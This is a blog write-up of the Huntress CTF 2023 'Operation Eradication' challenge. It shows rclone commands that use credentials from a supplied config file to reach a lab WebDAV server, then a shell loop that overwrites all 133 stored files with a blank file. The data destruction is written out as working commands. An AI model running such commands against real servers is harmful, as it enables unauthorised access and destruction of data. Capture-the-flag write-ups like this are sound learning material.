---
title: "Operation Eradication"
date: 2023-10-20T13:11:20-10:01
#draft: true
tags: ['CTF','Writeups', 'Misc', 'Medium']
---
 
# [Home](https://jjolley91.github.io/blog/) >

###  [Huntress CTF](https://jjolley91.github.io/blog/huntress_ctf_2023) >  [Medium Challenges](https://jjolley91.github.io/blog/huntress_ctf_2023/2.Medium/)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/thumb_drive)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/2.Medium/speakfriend) 

### Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment! They stole our data!

### Luckily, we found what looks like a configuration file, that seems to have credentials to the actor's storage server... but it doesn't seem to work. Can you get onto their server and delete all the data they stole!? 

Here we are given a txt file to download named 'operation_eradication'. This is a txt file with the following contents:
```txt
type = webdav
url = http://localhost/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```
We are also given a webserver to spin up. Visiting the page we see that there are 133 files which need to be deleted. 

![operation_eradication1](https://github.com/jjolley91/blog/blob/main/static/Huntress_CTF_2023/operation_eradication1.png?raw=true)

If we visit the '/webdav' directory of the site we are prompted for login credentials. However, the credentials provided in the file do not seem to work. We ended up using [rclone](https://rclone.org/webdav/) with the credentials, and were able to access the files:
```bash
rclone ls :webdav: --webdav-url=http://chal.ctf.games:32310/webdav/ --webdav-vendor=other --webdav-user=VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r --webdav-pass=HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```

This allowed us to see the various directories, and start trying to delete the files. There was a problem, however, in that we are only able to move and copy the files, we do not have the ability to actually delete them. 

So we need to find a way to delete the files without deleting the files. We can achieve this by creating a blank txt file, and copying it into the files, effectively erasing the data.
```bash
rclone copyto ./test.txt :webdav:HumanResources/EmployeeHandbook.pdf --webdav-url=http://chal.ctf.games:32310/webdav/ --webdav-vendor=other --webdav-user=VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r --webdav-pass=HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5 --size-only
```
Now we only need to repeat this process for the 132 remaining files. We can automate this process by saving the output of the ls command we ran into a .txt file, and removing the file size so that only the file paths remain. Finally, we simply use a for loop to copy our blank .txt file into all of the files like so:

```bash
for f in $(cat list.txt); do rclone copyto ./test.txt :webdav:$f --webdav-url=http://chal.ctf.games:32310/webdav/ --webdav-vendor=other --webdav-user=VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r --webdav-pass=HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5; done
```
We can return to the home page and retrieve the flag!

![operation_eradication2](https://github.com/jjolley91/blog/blob/main/static/Huntress_CTF_2023/operation_eradication.png?raw=true)

## [Back](https://jjolley91.github.io/blog/huntress_ctf_2023/thumb_drive)  <> [Next](https://jjolley91.github.io/blog/huntress_ctf_2023/2.Medium/speakfriend) 
